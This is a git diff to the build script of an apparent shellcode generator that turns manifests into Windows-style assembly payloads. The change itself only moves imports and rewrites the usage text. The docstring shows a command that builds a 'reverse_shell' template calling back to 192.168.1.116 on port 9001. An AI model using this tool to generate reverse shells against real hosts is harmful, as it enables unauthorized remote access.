@@ -1,11 +1,8 @@
 """Assembly build pipeline: manifest → generated.asm + generated_contract.md.
 
-Usage (from Tools/ directory):
-    python3 -m emitter.build manifests/revshell.yaml --template reverse_shell \
+Usage:
+    uv run emitter manifests/revshell.yaml --template reverse_shell \
         --lhost 192.168.1.116 --lport 9001 --out emitter_out/
-
-Usage (direct — any working directory):
-    python3 path/to/emitter/build.py manifests/revshell.yaml --template reverse_shell
 """
 from __future__ import annotations
 
@@ -14,16 +11,6 @@ import pathlib
 import sys
 from dataclasses import dataclass
 from datetime import datetime
-
-# Direct-execution shim: `python3 build.py` or `python3 path/to/build.py`.
-# Adds Tools/ to sys.path and re-runs this file as the emitter.build module
-# so that relative imports resolve correctly.  Must come before the relative
-# imports below.
-if __name__ == "__main__" and not __package__:
-    sys.path.insert(0, str(pathlib.Path(__file__).parent.parent))
-    import runpy
-    runpy.run_module("emitter.build", run_name="__main__", alter_sys=True)
-    raise SystemExit(0)
 
 from .api_database import API_DATABASE, MODULE_LOAD_ORDER
 from .api_emitter import emit_module_resolution
@@ -34,13 +21,7 @@ from .stack_alloc import StackLayout, build_layout
 from .string_emitter import emit_all_strings
 from .structure_emitter import emit_all_structures
 from .payload_templates.base import PayloadTemplate, TemplateConfig
-
-# strings.py lives one level above this package
-_TOOLS_DIR = str(pathlib.Path(__file__).parent.parent)
-if _TOOLS_DIR not in sys.path:
-    sys.path.insert(0, _TOOLS_DIR)
-
-from strings import emit_push, to_dwords  # noqa: E402
+from Tools.strings import emit_push, to_dwords
 
 # ---------------------------------------------------------------------------
 # Framework stubs (extracted verbatim from shellcode-04.py)
